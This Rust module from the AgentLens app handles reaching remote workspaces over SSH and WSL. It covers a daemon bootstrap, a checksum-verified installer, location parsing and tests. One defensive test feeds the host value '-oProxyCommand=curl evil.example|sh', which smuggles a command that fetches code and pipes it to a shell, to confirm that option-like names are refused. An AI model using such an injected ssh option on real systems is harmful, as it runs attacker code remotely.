//! Naming and reaching machines that aren't this one.
//!
//! Local knowledge that `agentlens-core` must not carry: how a remote
//! workspace is written down, how the daemon is *found or installed* over
//! there, and how a path on the far side is expressed so a Windows
//! application can open it.
//!
//! ## Never trust the remote `PATH`
//!
//! `ssh host command` runs without a login shell, so `~/.local/bin` is
//! usually absent from `PATH` and a perfectly well-installed daemon reports
//! "command not found". Asking users to work around that with a settings
//! field is asking them to solve a problem we created.
//!
//! So the app does what VS Code Remote does: it never names a bare command.
//! It runs a small shell [`bootstrap`] that looks in the places the daemon
//! could be, `exec`s the first one it finds, and — if there is none — prints
//! a marker naming the remote's OS and architecture. That marker is what
//! turns "the connection failed" into "the daemon isn't there yet, and here
//! is exactly which binary it needs", which is what makes [`install_script`]
//! possible.

use std::process::Command as ProcessCommand;

use agentlens_core::protocol::{CommandResult, ConnectionTarget};

/// The command AgentLens runs on the far side when nothing overrides it.
/// Bare on purpose: it is the sentinel for "the user has expressed no
/// preference, so find or install the daemon yourself".
pub const DEFAULT_DAEMON_COMMAND: &str = "agentlens-daemon";

/// Where AgentLens installs daemons it manages, relative to the remote user's
/// home. Version-scoped, so upgrading the app installs alongside rather than
/// over the top — and so a running daemon is never the file being replaced.
const INSTALL_ROOT: &str = ".agentlens/bin";

/// Printed by [`bootstrap`] when it found nothing to run. The two fields after
/// it are `uname -s` and `uname -m`.
const NOT_INSTALLED: &str = "agentlens-bootstrap: not-installed";

/// Where release assets are fetched from, for a remote that installs its own.
const RELEASES: &str = "https://github.com/harrison-wallace/AgentLens/releases/download";

/// What the remote reported about itself when it had no daemon to offer.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Platform {
    /// `uname -s` — `Linux`, `Darwin`, …
    pub os: String,
    /// `uname -m` — `x86_64`, `aarch64`, `arm64`, …
    pub arch: String,
}

impl Platform {
    /// The release asset this platform needs, or `None` if AgentLens does not
    /// publish a daemon for it — in which case the user is told that rather
    /// than watching a download fail.
    pub fn asset(&self) -> Option<&'static str> {
        match (self.os.as_str(), self.arch.as_str()) {
            ("Linux", "x86_64" | "amd64") => Some("agentlens-daemon-linux-x86_64"),
            ("Linux", "aarch64" | "arm64") => Some("agentlens-daemon-linux-aarch64"),
            _ => None,
        }
    }

    pub fn describe(&self) -> String {
        format!("{} {}", self.os, self.arch)
    }
}

/// The shell AgentLens runs on the far side to find a daemon and become one.
///
/// Ordered most-specific first: the copy this exact app version installed, then
/// the conventional manual locations, then whatever `PATH` offers. Finding a
/// manually installed daemon matters as much as installing one — someone who
/// has already run the `curl` from the setup guide should not need to configure
/// anything.
///
/// `exec` rather than a plain call so the daemon replaces this shell and owns
/// the stdio it was handed; an intermediate `sh` would sit between the app and
/// the protocol stream and swallow the EOF that means "shut down".
///
/// A daemon found anywhere but the managed directory has to *prove its
/// version* before it is run. It is not enough that it starts: a daemon from
/// an older release speaks the same protocol but knows fewer commands, so it
/// hand-shakes happily and then fails the first time the app asks for
/// something it has never heard of. A version left lying in `~/.local/bin`
/// would otherwise win over the correct one forever, because finding it stops
/// the app installing the one it actually wants.
pub fn bootstrap(version: &str) -> String {
    format!(
        r#"V={version}
D="$HOME/{root}/$V/agentlens-daemon"
if [ -x "$D" ]; then exec "$D" --stdio; fi
matches() {{ "$1" --version 2>/dev/null | grep -qF " $V "; }}
for d in "$HOME/.local/bin/agentlens-daemon" /usr/local/bin/agentlens-daemon /usr/bin/agentlens-daemon; do
  if [ -x "$d" ] && matches "$d"; then exec "$d" --stdio; fi
done
if command -v agentlens-daemon >/dev/null 2>&1 && matches agentlens-daemon; then
  exec agentlens-daemon --stdio
fi
echo "{marker} $(uname -s) $(uname -m)" >&2
exit 127
"#,
        version = version,
        root = INSTALL_ROOT,
        marker = NOT_INSTALLED,
    )
}

/// Read the bootstrap's marker out of whatever the remote wrote to stderr.
///
/// `None` means the connection failed for some other reason — bad host, refused
/// auth, no `sh` — and must be reported as itself rather than as a missing
/// daemon we could helpfully install.
pub fn parse_not_installed(stderr: &str) -> Option<Platform> {
    let line = stderr.lines().find(|line| line.contains(NOT_INSTALLED))?;
    let rest = line.split(NOT_INSTALLED).nth(1)?;
    let mut fields = rest.split_whitespace();
    Some(Platform {
        os: fields.next()?.to_string(),
        arch: fields.next()?.to_string(),
    })
}

/// The shell that puts a daemon on a remote that hasn't got one.
///
/// Downloaded by the remote rather than pushed from here, which is both what
/// VS Code does and the only thing that works when the app is on Windows and
/// the remote is Linux — this machine may have no copy of the right binary.
///
/// Integrity: `SHA256SUMS` is fetched alongside and checked when the release
/// publishes one. A release without it still installs (the transport is HTTPS
/// to GitHub, and the handshake immediately afterwards proves the binary is
/// the right version), but says so on stderr rather than pretending.
///
/// Variable names are `al_*` on purpose: WSL imports the Windows environment
/// into Linux processes, and names like `TMP` / `TEMP` are already set to
/// Windows paths. Reusing them made a mangled install script look like
/// "mkdir: cannot create directory ''".
pub fn install_script(version: &str, asset: &str) -> String {
    format!(
        r#"al_ver='{version}'
if [ -z "$HOME" ]; then echo "agentlens-install: HOME is unset; cannot install" >&2; exit 1; fi
al_dir="$HOME/{root}/$al_ver"
al_tmp="$al_dir/.download.$$"
al_asset='{asset}'
al_base='{releases}/v'"$al_ver"
if ! mkdir -p "$al_dir"; then echo "agentlens-install: cannot create $al_dir" >&2; exit 1; fi
trap 'rm -f "$al_tmp" "$al_tmp.sums"' EXIT
# Bounded, because a download that hangs forever hangs the app behind it.
if command -v curl >/dev/null 2>&1; then
  fetch() {{ curl -fsSL --max-time 300 "$1" -o "$2"; }}
elif command -v wget >/dev/null 2>&1; then
  fetch() {{ wget -q --timeout=60 --tries=2 -O "$2" "$1"; }}
else
  echo "agentlens-install: neither curl nor wget is available" >&2
  exit 1
fi
if ! fetch "$al_base/$al_asset" "$al_tmp"; then
  echo "agentlens-install: could not download $al_base/$al_asset" >&2
  exit 1
fi
if fetch "$al_base/SHA256SUMS" "$al_tmp.sums" 2>/dev/null; then
  # Fixed-string match; avoid `" $ASSET$"` where the trailing `$` is easy to
  # mis-parse when the script has been through a Windows command line.
  want=$(grep -F " $al_asset" "$al_tmp.sums" | head -n1 | cut -d' ' -f1)
  if command -v sha256sum >/dev/null 2>&1; then got=$(sha256sum "$al_tmp" | cut -d' ' -f1)
  elif command -v shasum >/dev/null 2>&1; then got=$(shasum -a 256 "$al_tmp" | cut -d' ' -f1)
  else got=""; fi
  if [ -n "$want" ] && [ -n "$got" ] && [ "$want" != "$got" ]; then
    echo "agentlens-install: checksum mismatch for $al_asset" >&2
    exit 1
  fi
else
  echo "agentlens-install: this release publishes no SHA256SUMS; skipping checksum" >&2
fi
chmod +x "$al_tmp" || exit 1
mv -f "$al_tmp" "$al_dir/agentlens-daemon" || exit 1
# Old versions are dead weight the moment this one works. Confined to our own
# directory, and never the version just installed.
for old in "$HOME/{root}"/*; do
  case "$old" in "$al_dir") continue;; esac
  [ -d "$old" ] && rm -rf "$old"
done
exec "$al_dir/agentlens-daemon" --version
"#,
        version = version,
        root = INSTALL_ROOT,
        asset = asset,
        releases = RELEASES,
    )
}

/// Write a workspace root down in a way that survives being put in a list of
/// recent workspaces and clicked a week later.
///
/// A bare path means "on this machine". Anything else carries the machine
/// with it, because `/home/h/proj` on two different SSH hosts are two
/// different workspaces and must not share settings or a recents entry.
pub fn format_location(target: &ConnectionTarget, root: &str) -> String {
    match target {
        ConnectionTarget::Local => root.to_string(),
        ConnectionTarget::Wsl { distro } => format!("wsl://{distro}{}", with_leading_slash(root)),
        ConnectionTarget::Ssh { host } => format!("ssh://{host}{}", with_leading_slash(root)),
    }
}

/// The inverse of [`format_location`]. Anything unrecognised is a local path,
/// including Windows drive paths — `C:/x` has a colon but no `//`.
pub fn parse_location(location: &str) -> (ConnectionTarget, String) {
    for (scheme, build) in [
        (
            "wsl://",
            (|name| ConnectionTarget::Wsl { distro: name }) as fn(String) -> _,
        ),
        (
            "ssh://",
            (|name| ConnectionTarget::Ssh { host: name }) as fn(String) -> _,
        ),
    ] {
        if let Some(rest) = location.strip_prefix(scheme) {
            let (name, path) = match rest.find('/') {
                Some(at) => (&rest[..at], &rest[at..]),
                // No path at all means the home directory, and the backend
                // resolves an empty path to exactly that. Sending `.` instead
                // would resolve to the *process's* working directory, which
                // for a daemon is wherever the thing that spawned it happened
                // to be.
                None => (rest, ""),
            };
            return (build(name.to_string()), path.to_string());
        }
    }
    (ConnectionTarget::Local, location.to_string())
}

fn with_leading_slash(root: &str) -> String {
    if root.starts_with('/') {
        root.to_string()
    } else {
        format!("/{root}")
    }
}

/// The program and arguments that start a daemon for `target`.
///
/// When `daemon` is the default sentinel this runs [`bootstrap`], which finds
/// the daemon wherever it actually is. When the user has named a command, that
/// command is run verbatim — an explicit setting is an instruction, not a hint,
/// and it stays the escape hatch for anything the bootstrap cannot cope with
/// (a Windows remote whose shell is `cmd.exe`, say).
///
/// `None` for a local target (there is no process to spawn, the engine is
/// already here) and for a host or distro name that would be read as an
/// option — see [`is_option_like`].
pub fn spawn_spec(
    target: &ConnectionTarget,
    daemon: &str,
    version: &str,
) -> Option<(String, Vec<String>)> {
    let daemon = daemon.trim();
    let script = if daemon.is_empty() || daemon == DEFAULT_DAEMON_COMMAND {
        bootstrap(version)
    } else {
        format!("exec {} --stdio", shell_quote(daemon))
    };
    remote_shell(target, &script)
}

/// The program and arguments that install a daemon on `target`.
pub fn install_spec(
    target: &ConnectionTarget,
    version: &str,
    asset: &str,
) -> Option<(String, Vec<String>)> {
    remote_shell(target, &install_script(version, asset))
}

/// Run `script` under `/bin/sh` on the far side.
///
/// The script is always [pack_script]'d (base64) before it crosses the
/// process boundary. A multi-line `sh -c` body full of `$HOME` / `"…"` is
/// fragile on Windows→WSL: empty expansions of `DIR`/`TMP`/`ASSET` produced
/// install failures like `mkdir: cannot create directory ''` and
/// `grep: ".sums"`. The packed form is one line with no `$` for anything
/// intermediate to expand.
///
/// SSH still needs an extra layer of quoting because `ssh host cmd` joins
/// `cmd` for the *remote* login shell; WSL gets argv after `--` as-is.
fn remote_shell(target: &ConnectionTarget, script: &str) -> Option<(String, Vec<String>)> {
    let packed = pack_script(script);
    match target {
        ConnectionTarget::Local => None,
        // `--` also ends wsl.exe's own option parsing, so nothing in the
        // payload can be mistaken for a wsl flag.
        ConnectionTarget::Wsl { distro } => (!is_option_like(distro)).then(|| {
            (
                "wsl.exe".to_string(),
                vec![
                    "-d".to_string(),
                    distro.clone(),
                    "--".to_string(),
                    "sh".to_string(),
                    "-c".to_string(),
                    packed,
                ],
            )
        }),
        ConnectionTarget::Ssh { host } => (!is_option_like(host)).then(|| {
            (
                "ssh".to_string(),
                vec![host.clone(), format!("sh -c {}", shell_quote(&packed))],
            )
        }),
    }
}

/// Base64-wrap `script` so it reaches a remote `sh` with `$` and quotes intact.
///
/// Decoded to a temp file and `exec sh` on that file — **not** piped into
/// `sh`. Piping would make the script stdin of the inner shell, so when the
/// bootstrap `exec`s the daemon it would inherit the closed pipe instead of
/// the protocol stdio from `wsl.exe` / `ssh` ("lost the connection").
///
/// The alphabet has no `'`, so single-quoting the payload is safe. GNU
/// coreutils and busybox both accept `base64 -d`.
fn pack_script(script: &str) -> String {
    let b64 = base64_encode(script.as_bytes());
    format!(
        "t=\"${{TMPDIR:-/tmp}}/agentlens-run.$$\"; printf '%s' '{b64}' | base64 -d >\"$t\" && exec sh \"$t\""
    )
}

fn base64_encode(input: &[u8]) -> String {
    const TABLE: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    let mut out = String::with_capacity(input.len().div_ceil(3) * 4);
    for chunk in input.chunks(3) {
        let b0 = u32::from(chunk[0]);
        let b1 = u32::from(chunk.get(1).copied().unwrap_or(0));
        let b2 = u32::from(chunk.get(2).copied().unwrap_or(0));
        let n = (b0 << 16) | (b1 << 8) | b2;
        out.push(TABLE[((n >> 18) & 63) as usize] as char);
        out.push(TABLE[((n >> 12) & 63) as usize] as char);
        out.push(if chunk.len() > 1 {
            TABLE[((n >> 6) & 63) as usize] as char
        } else {
            '='
        });
        out.push(if chunk.len() > 2 {
            TABLE[(n & 63) as usize] as char
        } else {
            '='
        });
    }
    out
}

/// True for a name that the program being spawned would parse as one of its
/// own options rather than as a host or distro.
///
/// `ssh` has no `--` to end option parsing, so `-oProxyCommand=…` in the host
/// position runs an arbitrary command. Nothing untrusted reaches here today —
/// these names are typed by the user or read back from their own recents — but
/// the whole point of a location string is that it travels, and a check this
/// cheap should not wait for the day one arrives from somewhere else.
fn is_option_like(name: &str) -> bool {
    name.trim().starts_with('-')
}

/// Wrap `value` for a POSIX shell. Single quotes take everything literally,
/// and the only character they can't contain is a single quote — which is
/// spliced in the usual way.
fn shell_quote(value: &str) -> String {
    format!("'{}'", value.replace('\'', r"'\''"))
}

/// Express `path` (absolute, on the far side) so a *Windows* application can
/// open it.
///
/// Only WSL can answer this: Windows exposes a distro's filesystem at
/// `\\wsl$\<distro>\…`. An SSH host has no such bridge, so the caller is told
/// why rather than handed a path that silently opens nothing.
pub fn to_local_path(target: &ConnectionTarget, path: &str) -> CommandResult<String> {
    match target {
        ConnectionTarget::Local => Ok(path.to_string()),
        ConnectionTarget::Wsl { distro } => {
            let trimmed = path.trim_start_matches('/').replace('/', "\\");
            Ok(format!(r"\\wsl$\{distro}\{trimmed}"))
        }
        ConnectionTarget::Ssh { host } => Err(format!(
            "{host} is reached over SSH, so its files have no path this machine can open. \
             Preview and diff work; opening in another application does not."
        )),
    }
}

/// Install the daemon on `target` and return what it reports about itself.
///
/// Runs as its own short-lived process rather than over the protocol channel:
/// there is no daemon to talk to yet, which is the entire point.
pub fn provision(target: &ConnectionTarget, version: &str, asset: &str) -> CommandResult<String> {
    let (program, args) =
        install_spec(target, version, asset).ok_or("this connection cannot be installed to")?;

    let mut command = ProcessCommand::new(&program);
    command.args(&args);
    #[cfg(windows)]
    {
        use std::os::windows::process::CommandExt;
        const CREATE_NO_WINDOW: u32 = 0x0800_0000;
        command.creation_flags(CREATE_NO_WINDOW);
    }

    let output = command
        .output()
        .map_err(|e| format!("failed to run `{program}`: {e}"))?;

    if !output.status.success() {
        let reason = String::from_utf8_lossy(&output.stderr);
        let reason = reason.trim();
        return Err(if reason.is_empty() {
            format!("the install failed on {}", target.label())
        } else {
            format!("the install failed on {}:\n{reason}", target.label())
        });
    }
    Ok(String::from_utf8_lossy(&output.stdout).trim().to_string())
}

/// WSL distros installed on this machine, as `wsl.exe -l -q` reports them.
///
/// Empty on anything that isn't Windows, and on a Windows box without WSL —
/// both are "nothing to offer", not errors, because the picker shows this
/// list unconditionally.
pub fn wsl_distros() -> Vec<String> {
    if !cfg!(windows) {
        return Vec::new();
    }
    let Ok(output) = ProcessCommand::new("wsl.exe").args(["-l", "-q"]).output() else {
        return Vec::new();
    };
    if !output.status.success() {
        return Vec::new();
    }
    parse_distro_list(&output.stdout)
}

/// Split `wsl.exe -l -q` output into distro names.
///
/// Split out from the spawning because of the encoding: wsl.exe writes
/// **UTF-16LE**, so the bytes are full of NULs and a naive `from_utf8_lossy`
/// yields a name per replacement character. Both encodings are handled since
/// the behaviour has varied across Windows builds.
fn parse_distro_list(stdout: &[u8]) -> Vec<String> {
    let text = if stdout.iter().skip(1).step_by(2).any(|b| *b == 0) {
        let units: Vec<u16> = stdout
            .chunks_exact(2)
            .map(|pair| u16::from_le_bytes([pair[0], pair[1]]))
            .collect();
        String::from_utf16_lossy(&units)
    } else {
        String::from_utf8_lossy(stdout).into_owned()
    };

    text.lines()
        // A UTF-16 BOM and a stray CR both survive `lines()`.
        .map(|line| line.trim_matches(|c: char| c.is_whitespace() || c == '\u{feff}'))
        .filter(|line| !line.is_empty())
        .map(str::to_string)
        .collect()
}

#[cfg(test)]
mod tests {
    use super::*;

    fn wsl(distro: &str) -> ConnectionTarget {
        ConnectionTarget::Wsl {
            distro: distro.to_string(),
        }
    }

    fn ssh(host: &str) -> ConnectionTarget {
        ConnectionTarget::Ssh {
            host: host.to_string(),
        }
    }

    #[test]
    fn locations_round_trip() {
        let cases = [
            (ConnectionTarget::Local, "/home/h/proj"),
            (wsl("Ubuntu"), "/home/h/proj"),
            (ssh("build-box"), "/srv/app"),
        ];
        for (target, root) in cases {
            let location = format_location(&target, root);
            assert_eq!(parse_location(&location), (target, root.to_string()));
        }
    }

    #[test]
    fn a_windows_drive_path_is_local_not_a_scheme() {
        assert_eq!(
            parse_location("C:/Users/h/proj"),
            (ConnectionTarget::Local, "C:/Users/h/proj".to_string())
        );
    }

    #[test]
    fn a_host_with_no_path_resolves_to_the_login_directory() {
        assert_eq!(
            parse_location("ssh://build-box"),
            (ssh("build-box"), String::new())
        );
    }

    #[test]
    fn wsl_runs_the_bootstrap_under_sh_with_options_terminated() {
        let (program, args) = spawn_spec(&wsl("Ubuntu-22.04"), "", "0.1.0").unwrap();
        assert_eq!(program, "wsl.exe");
        assert_eq!(args[..5], ["-d", "Ubuntu-22.04", "--", "sh", "-c"]);
        // Packed so `$HOME` etc. never sit in the Windows→WSL command line.
        assert_eq!(args[5], pack_script(&bootstrap("0.1.0")));
        assert!(args[5].contains("base64 -d"), "{}", args[5]);
    }

    #[test]
    fn ssh_quotes_the_packed_script_for_the_remote_shell() {
        let (program, args) = spawn_spec(&ssh("box"), "", "0.1.0").unwrap();
        assert_eq!(program, "ssh");
        assert_eq!(args[0], "box");
        assert_eq!(
            args[1],
            format!("sh -c {}", shell_quote(&pack_script(&bootstrap("0.1.0"))))
        );
    }

    #[test]
    fn an_explicit_daemon_command_is_run_verbatim() {
        // The escape hatch has to stay literal: it is what rescues anything
        // the bootstrap can't cope with. Still packed for the same transport
        // reasons as the bootstrap.
        let (_, args) =
            spawn_spec(&ssh("box"), "/opt/my daemons/agentlens-daemon", "0.1.0").unwrap();
        let inner = pack_script("exec '/opt/my daemons/agentlens-daemon' --stdio");
        assert_eq!(args[1], format!("sh -c {}", shell_quote(&inner)));

        let (_, args) = spawn_spec(&wsl("Ubuntu"), "/opt/daemon", "0.1.0").unwrap();
        assert_eq!(args[5], pack_script("exec '/opt/daemon' --stdio"));
    }

    #[test]
    fn pack_script_round_trips_through_base64_and_preserves_dollars() {
        // The failure mode we are fixing: a script full of `$HOME` must still
        // mean `$HOME` after it has crossed into a remote `sh`.
        let script = r#"echo "HOME=$HOME"; echo ok"#;
        let packed = pack_script(script);
        assert!(
            packed.contains("base64 -d"),
            "must decode the payload: {packed}"
        );
        assert!(
            packed.contains("exec sh"),
            "must exec so the daemon inherits protocol stdio: {packed}"
        );
        assert!(
            !packed.contains("$HOME"),
            "payload must not leak into the wrapper: {packed}"
        );
    }

    #[cfg(unix)]
    #[test]
    fn pack_script_keeps_stdin_for_the_inner_script() {
        // Prove we did not pipe the script into `sh` (which would steal stdin).
        // The packed wrapper should still be able to read a line from stdin
        // after starting — matching how the daemon needs the protocol pipe.
        let script = r#"read line; echo "got:$line""#;
        let packed = pack_script(script);
        let mut child = std::process::Command::new("sh")
            .arg("-c")
            .arg(&packed)
            .stdin(std::process::Stdio::piped())
            .stdout(std::process::Stdio::piped())
            .spawn()
            .unwrap();
        use std::io::Write;
        child
            .stdin
            .as_mut()
            .unwrap()
            .write_all(b"protocol\n")
            .unwrap();
        let out = child.wait_with_output().unwrap();
        assert!(
            out.status.success(),
            "stderr={}",
            String::from_utf8_lossy(&out.stderr)
        );
        assert_eq!(String::from_utf8_lossy(&out.stdout).trim(), "got:protocol");
    }

    #[test]
    fn local_has_nothing_to_spawn() {
        assert!(spawn_spec(&ConnectionTarget::Local, "", "0.1.0").is_none());
        assert!(install_spec(&ConnectionTarget::Local, "0.1.0", "x").is_none());
    }

    #[test]
    fn a_name_that_would_be_read_as_an_option_is_refused() {
        // `ssh -oProxyCommand=… host` runs an arbitrary command, and ssh has
        // no `--` to hide behind.
        assert!(spawn_spec(&ssh("-oProxyCommand=curl evil.example|sh"), "", "0.1.0").is_none());
        assert!(spawn_spec(&ssh("  -oBatchMode=no"), "", "0.1.0").is_none());
        assert!(spawn_spec(&wsl("--shell-type"), "", "0.1.0").is_none());
        assert!(install_spec(&ssh("-oProxyCommand=x"), "0.1.0", "a").is_none());
        // Dashes elsewhere are perfectly ordinary names.
        assert!(spawn_spec(&ssh("build-box"), "", "0.1.0").is_some());
        assert!(spawn_spec(&wsl("Ubuntu-22.04"), "", "0.1.0").is_some());
    }

    #[test]
    fn the_bootstrap_prefers_our_install_then_manual_ones_then_path() {
        let script = bootstrap("0.1.0");
        let ours = script.find(".agentlens/bin").unwrap();
        let manual = script.find(".local/bin/agentlens-daemon").unwrap();
        let usr = script.find("/usr/local/bin/agentlens-daemon").unwrap();
        let path = script.find("command -v agentlens-daemon").unwrap();

        assert!(ours < manual && manual < usr && usr < path, "{script}");
        // A found daemon must replace the shell, or an `sh` sits between the
        // app and the protocol stream.
        assert!(script.contains(r#"exec "$D" --stdio"#), "{script}");
    }

    #[test]
    fn a_bootstrap_that_found_nothing_names_the_platform() {
        let stderr = "some ssh banner\nagentlens-bootstrap: not-installed Linux aarch64\n";
        let platform = parse_not_installed(stderr).unwrap();

        assert_eq!(platform.os, "Linux");
        assert_eq!(platform.arch, "aarch64");
        assert_eq!(platform.asset(), Some("agentlens-daemon-linux-aarch64"));
    }

    #[test]
    fn other_failures_are_not_mistaken_for_a_missing_daemon() {
        // Reporting "the daemon isn't installed" for a refused login would
        // send the user off installing something that is already there.
        for stderr in [
            "",
            "Permission denied (publickey).",
            "ssh: Could not resolve hostname nope",
            "bash: line 1: sh: command not found",
        ] {
            assert_eq!(parse_not_installed(stderr), None, "{stderr}");
        }
    }

    #[test]
    fn a_platform_with_no_published_daemon_says_so_rather_than_guessing() {
        let unsupported = Platform {
            os: "FreeBSD".into(),
            arch: "riscv64".into(),
        };
        assert_eq!(unsupported.asset(), None);
        assert_eq!(unsupported.describe(), "FreeBSD riscv64");

        // Both names the world uses for 64-bit ARM map to one asset.
        for arch in ["aarch64", "arm64"] {
            assert_eq!(
                Platform {
                    os: "Linux".into(),
                    arch: arch.into()
                }
                .asset(),
                Some("agentlens-daemon-linux-aarch64")
            );
        }
    }

    /// Run the bootstrap the way a remote would: `sh -c`, with a home
    /// directory we control and a `PATH` that has nothing helpful on it.
    ///
    /// Asserting on the *text* of a shell script proves it was written; only
    /// running it proves it works. These are `unix` because they need a POSIX
    /// `sh` — on Windows the WSL smoke test in `child.rs` covers the same
    /// ground against a real distro.
    #[cfg(unix)]
    fn run_bootstrap(home: &std::path::Path, version: &str) -> std::process::Output {
        ProcessCommand::new("sh")
            .arg("-c")
            .arg(bootstrap(version))
            .env_clear()
            .env("HOME", home)
            .env("PATH", "/usr/bin:/bin")
            .output()
            .expect("sh must be runnable")
    }

    /// A stand-in daemon that announces which copy of itself ran, and answers
    /// `--version` the way the real one does — which the bootstrap checks
    /// before it will run anything outside the directory it manages.
    #[cfg(unix)]
    fn stub_daemon(at: &std::path::Path, label: &str, version: &str) {
        use std::os::unix::fs::PermissionsExt;
        std::fs::create_dir_all(at.parent().unwrap()).unwrap();
        std::fs::write(
            at,
            format!(
                "#!/bin/sh\n\
                 if [ \"$1\" = \"--version\" ]; then echo 'agentlens-daemon {version} (protocol 1)'; exit 0; fi\n\
                 echo '{label}' \"$@\"\n"
            ),
        )
        .unwrap();
        std::fs::set_permissions(at, std::fs::Permissions::from_mode(0o755)).unwrap();
    }

    #[cfg(unix)]
    #[test]
    fn the_bootstrap_runs_a_daemon_it_finds_and_passes_stdio() {
        let home = tempfile::tempdir().unwrap();
        stub_daemon(
            &home.path().join(".local/bin/agentlens-daemon"),
            "manual-install",
            "0.1.0",
        );

        let out = run_bootstrap(home.path(), "0.1.0");

        assert!(out.status.success(), "{:?}", out);
        assert_eq!(
            String::from_utf8_lossy(&out.stdout).trim(),
            "manual-install --stdio"
        );
    }

    #[cfg(unix)]
    #[test]
    fn the_bootstrap_prefers_the_version_it_manages_over_a_manual_one() {
        // Someone with an old hand-placed daemon must still get the one this
        // app installed, or an upgrade would silently keep talking to the
        // previous protocol.
        let home = tempfile::tempdir().unwrap();
        stub_daemon(
            &home.path().join(".local/bin/agentlens-daemon"),
            "manual",
            "0.1.0",
        );
        stub_daemon(
            &home.path().join(".agentlens/bin/0.1.0/agentlens-daemon"),
            "managed",
            "0.1.0",
        );

        let out = run_bootstrap(home.path(), "0.1.0");

        assert_eq!(
            String::from_utf8_lossy(&out.stdout).trim(),
            "managed --stdio"
        );
    }

    #[cfg(unix)]
    #[test]
    fn the_bootstrap_ignores_a_managed_daemon_of_another_version() {
        let home = tempfile::tempdir().unwrap();
        stub_daemon(
            &home.path().join(".agentlens/bin/0.0.9/agentlens-daemon"),
            "stale",
            "0.0.9",
        );

        let out = run_bootstrap(home.path(), "0.1.0");

        assert_eq!(out.status.code(), Some(127));
        assert!(parse_not_installed(&String::from_utf8_lossy(&out.stderr)).is_some());
    }

    #[cfg(unix)]
    #[test]
    fn a_hand_installed_daemon_of_the_wrong_version_is_not_run() {
        // The failure this prevents is nasty because it looks like success: an
        // older daemon speaks the same protocol, so it hand-shakes fine and
        // then does not recognise the first newer command it is asked for.
        // Worse, finding it stops the app installing the version it wanted, so
        // the wrong one wins every connection from then on.
        let home = tempfile::tempdir().unwrap();
        stub_daemon(
            &home.path().join(".local/bin/agentlens-daemon"),
            "stale",
            "0.1.0",
        );

        let out = run_bootstrap(home.path(), "0.2.0");

        assert_eq!(out.status.code(), Some(127), "{:?}", out);
        assert!(
            parse_not_installed(&String::from_utf8_lossy(&out.stderr)).is_some(),
            "a mismatch must report as not-installed so the right one gets installed"
        );
    }

    #[cfg(unix)]
    #[test]
    fn the_bootstrap_reports_a_real_platform_when_it_finds_nothing() {
        let home = tempfile::tempdir().unwrap();

        let out = run_bootstrap(home.path(), "0.1.0");

        assert_eq!(out.status.code(), Some(127), "must not look like success");
        assert!(out.stdout.is_empty(), "the marker belongs on stderr only");

        let platform = parse_not_installed(&String::from_utf8_lossy(&out.stderr))
            .expect("the marker must be parseable");
        // Not hardcoded: this is whatever machine is running the tests, which
        // is the point — the values come from `uname` on the far side.
        assert!(!platform.os.is_empty() && !platform.arch.is_empty());
        assert!(
            platform.asset().is_some(),
            "{platform:?} should be supported"
        );
    }

    #[cfg(unix)]
    #[test]
    fn a_non_executable_file_is_not_mistaken_for_a_daemon() {
        // A half-finished download, or a file saved without the +x bit, must
        // fall through to the next candidate rather than fail the connection.
        let home = tempfile::tempdir().unwrap();
        let dud = home.path().join(".agentlens/bin/0.1.0/agentlens-daemon");
        std::fs::create_dir_all(dud.parent().unwrap()).unwrap();
        std::fs::write(&dud, "not executable").unwrap();
        stub_daemon(
            &home.path().join(".local/bin/agentlens-daemon"),
            "fallback",
            "0.1.0",
        );

        let out = run_bootstrap(home.path(), "0.1.0");

        assert_eq!(
            String::from_utf8_lossy(&out.stdout).trim(),
            "fallback --stdio"
        );
    }

    #[test]
    fn the_installer_downloads_verifies_and_replaces_atomically() {
        let script = install_script("0.1.0", "agentlens-daemon-linux-x86_64");

        assert!(script.contains("releases/download/v"), "{script}");
        assert!(script.contains("SHA256SUMS"), "{script}");
        assert!(script.contains("checksum mismatch"), "{script}");
        // Downloaded beside the target and renamed, never written in place —
        // replacing a running binary is how you earn ETXTBSY.
        assert!(
            script.contains(r#"mv -f "$al_tmp" "$al_dir/agentlens-daemon""#),
            "{script}"
        );
        // Neither curl nor wget is a real possibility on a minimal image.
        assert!(script.contains("neither curl nor wget"), "{script}");
        // Pruning must never escape our own directory.
        assert!(
            script.contains(r#"for old in "$HOME/.agentlens/bin"/*"#),
            "{script}"
        );
        // Must not reuse Windows-imported names (TMP/TEMP/DIR).
        assert!(!script.contains("TMP="), "{script}");
        assert!(!script.contains("$TMP"), "{script}");
    }

    #[test]
    fn wsl_paths_translate_to_the_unc_bridge() {
        assert_eq!(
            to_local_path(&wsl("Ubuntu"), "/home/h/proj/a.txt").unwrap(),
            r"\\wsl$\Ubuntu\home\h\proj\a.txt"
        );
    }

    #[test]
    fn ssh_paths_explain_why_they_cannot_be_opened() {
        let err = to_local_path(&ssh("box"), "/srv/a.txt").unwrap_err();
        assert!(err.contains("box"), "{err}");
    }

    #[test]
    fn distro_lists_are_parsed_from_utf16_and_utf8_alike() {
        let utf16: Vec<u8> = "Ubuntu\r\nDebian\r\n"
            .encode_utf16()
            .flat_map(u16::to_le_bytes)
            .collect();
        assert_eq!(parse_distro_list(&utf16), vec!["Ubuntu", "Debian"]);

        assert_eq!(
            parse_distro_list(b"\xef\xbb\xbfUbuntu\nDebian\n\n"),
            vec!["Ubuntu", "Debian"]
        );
    }
}
